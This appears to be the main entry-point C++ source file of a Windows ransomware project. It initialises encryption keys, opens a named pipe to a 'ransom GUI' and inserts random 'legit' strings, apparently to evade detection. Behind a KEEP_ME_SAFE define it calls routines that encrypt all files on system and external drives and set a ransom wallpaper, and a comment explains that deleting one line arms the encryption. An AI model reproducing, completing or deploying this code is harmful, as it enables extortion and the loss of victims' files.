#include <windows.h>
#include <iostream>
#include <fstream>
#include <memory>

#include "ServiceWorker.hpp"
#include "..\..\include\include.hpp"

// Remove this line to enable encryption
#define KEEP_ME_SAFE


int APIENTRY wWinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPWSTR lpCmdLine, _In_ int nCmdShow)
{
	dbg::initLogs();

	INSERT_RND_LEGIT_STR;

	auto& worker = ServiceWorker::getInstance();
	auto comsServer = std::make_unique<NamedPipeServer>("RAwarePipeComs");

	// Initialize communication with GUI
	if (not comsServer->create())
	{
		DBG_PRINT("Failed to create named pipe");
		utils::stopAndExit(EXIT_FAILURE);
	}

	// Initialize encryption keys and setup user data resources
	worker.init();

#ifndef KEEP_ME_SAFE
	// Encrypting all files on the system and external drives
	const auto drives = worker.getDrives();
	worker.encryptAllFiles(drives);

	// Set wallpaper
	worker.setWallpaper();
#endif

	// Open ransom GUI after encryption
	worker.openGUI();

	// Wait for GUI to connect
	if (not comsServer->connect())
	{
		DBG_PRINT("Failed to connect to named pipe");
		utils::stopAndExit(EXIT_FAILURE);
	}

#ifndef KEEP_ME_SAFE
	// Handle messages from GUI
	worker.handleServerComs(std::move(comsServer));
#endif

	utils::stopAndExit(EXIT_SUCCESS);
}